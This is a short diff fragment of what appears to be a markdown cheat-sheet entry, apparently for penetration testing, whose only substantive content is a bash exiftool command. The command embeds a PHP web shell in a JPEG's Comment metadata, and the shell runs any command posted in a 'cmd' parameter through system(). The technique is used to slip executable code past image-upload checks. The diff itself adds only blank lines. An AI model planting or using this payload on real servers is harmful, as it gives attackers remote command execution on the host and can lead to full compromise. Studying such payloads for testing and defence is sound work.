@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:24:34.601053+00:00'
 ```bash
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
+
+
